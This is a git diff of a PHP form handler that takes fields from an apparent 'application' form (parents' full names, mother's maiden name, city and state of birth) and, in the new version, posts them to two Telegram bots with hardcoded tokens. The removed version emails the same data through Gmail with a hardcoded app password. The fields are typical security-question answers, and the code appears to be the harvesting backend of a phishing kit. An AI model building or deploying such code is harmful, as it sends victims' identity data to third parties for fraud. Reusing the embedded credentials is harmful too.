@@ -1,66 +1,63 @@
 <?php
-// Load Composer dependencies (if using Composer)
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
+date_default_timezone_set("UTC");
 
-require 'vendor/autoload.php'; // if using Composer
-// OR
-require 'PHPMailer/src/PHPMailer.php';
-require 'PHPMailer/src/SMTP.php';
-require 'PHPMailer/src/Exception.php';
+// === CONFIGURATION ===
+$telegramBots = [
+    [
+        'bot_token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY',  // 🔁 Replace with your Bot 1 Token
+        'chat_id'   => '1325797388',                // 🔁 Replace with your Bot 1 Chat ID
+    ],
+    [
+        'bot_token' => '8173202881:AAFk6jNXvJ-5b4ZNH0gV8IfmEnOW7qdJO8U',  // 🔁 Replace with your Bot 2 Token
+        'chat_id'   => '7339107338',                // 🔁 Replace with your Bot 2 Chat ID
+    ],
+    // ✅ Add more bots here if needed
+];
 
-date_default_timezone_set("UTC"); // Adjust if needed
+// === CAPTURE FORM DATA ===
+$fatherFirst  = htmlspecialchars($_POST['q105_fathersFull']['first'] ?? '');
+$fatherLast   = htmlspecialchars($_POST['q105_fathersFull']['last'] ?? '');
+$motherFirst  = htmlspecialchars($_POST['q106_mothersFull']['first'] ?? '');
+$motherLast   = htmlspecialchars($_POST['q106_mothersFull']['last'] ?? '');
+$maidenName   = htmlspecialchars($_POST['q108_mothersmaiden'] ?? '');
+$birthCity    = htmlspecialchars($_POST['q107_placeofbirth'] ?? '');
+$birthState   = htmlspecialchars($_POST['q30_state'] ?? '');
+$consent      = isset($_POST['q52_iHereby']) ? 'YES' : 'NO';
+$timestamp    = date('Y-m-d H:i:s');
 
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Collect and sanitize data
-    $fatherFirst = htmlspecialchars($_POST['q105_fathersFull']['first'] ?? '');
-    $fatherLast = htmlspecialchars($_POST['q105_fathersFull']['last'] ?? '');
-    $motherFirst = htmlspecialchars($_POST['q106_mothersFull']['first'] ?? '');
-    $motherLast = htmlspecialchars($_POST['q106_mothersFull']['last'] ?? '');
-    $maidenName = htmlspecialchars($_POST['q108_mothersmaiden'] ?? '');
-    $birthCity = htmlspecialchars($_POST['q107_placeofbirth'] ?? '');
-    $state = htmlspecialchars($_POST['q30_state'] ?? '');
-    $consent = isset($_POST['q52_iHereby']) ? 'YES' : 'NO';
-    $timestamp = date("Y-m-d H:i:s");
+// === FORMAT MESSAGE ===
+$message = <<<TEXT
+📝 *New Application Submission*
 
-    // Build the email message
-    $body = <<<EOD
-New Application Submission:
+👨‍👧 Father's Name: $fatherFirst $fatherLast
+👩‍👧 Mother's Name: $motherFirst $motherLast
+👵 Maiden Name: $maidenName
+🏙️ City of Birth: $birthCity
+🌆 State: $birthState
+✅ Consent: $consent
+🕒 Time (UTC): $timestamp
+TEXT;
 
-Father's Full Name: $fatherFirst $fatherLast
-Mother's Full Name: $motherFirst $motherLast
-Mother's Maiden Name: $maidenName
-Place of Birth (City): $birthCity
-State: $state
-Consent Given: $consent
-Submission Time (UTC): $timestamp
-EOD;
+// === SEND TO ALL TELEGRAM BOTS ===
+foreach ($telegramBots as $bot) {
+    $sendURL = "https://api.telegram.org/bot{$bot['bot_token']}/sendMessage";
 
-    // Send using PHPMailer
-    $mail = new PHPMailer(true);
-    try {
-        // Server settings
-        $mail->isSMTP();
-        $mail->Host       = 'smtp.gmail.com';
-        $mail->SMTPAuth   = true;
-        $mail->Username   = 'oysterhr00@gmail.com';          // 🔁 your Gmail address
-        $mail->Password   = 'gxvllpjxxjqdhhjn';     // 🔁 your 16-char App Password (no spaces)
-        $mail->SMTPSecure = 'tls';                     // Or 'ssl'
-        $mail->Port       = 587;                       // Or 465 if using 'ssl'
+    $payload = [
+        'chat_id' => $bot['chat_id'],
+        'text'    => $message,
+        'parse_mode' => 'Markdown'
+    ];
 
-        $mail->setFrom('oysterhr00@gmail.com', 'Application Bot');
-        $mail->addAddress('ericpsewell.00@gmail.com');           // Can be same or different recipient
-        // Content
-        $mail->isHTML(false);
-        $mail->Subject = 'New Application Submission';
-        $mail->Body    = $body;
-
-        $mail->send();
-        echo "Thank you. Your application has been submitted.";
-    } catch (Exception $e) {
-        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
-    }
-} else {
-    echo "Invalid request.";
+    // Use cURL to send
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $sendURL);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    curl_close($ch);
 }
+
+// === SUCCESS OUTPUT ===
+echo "✅ Application submitted successfully.";
 ?>
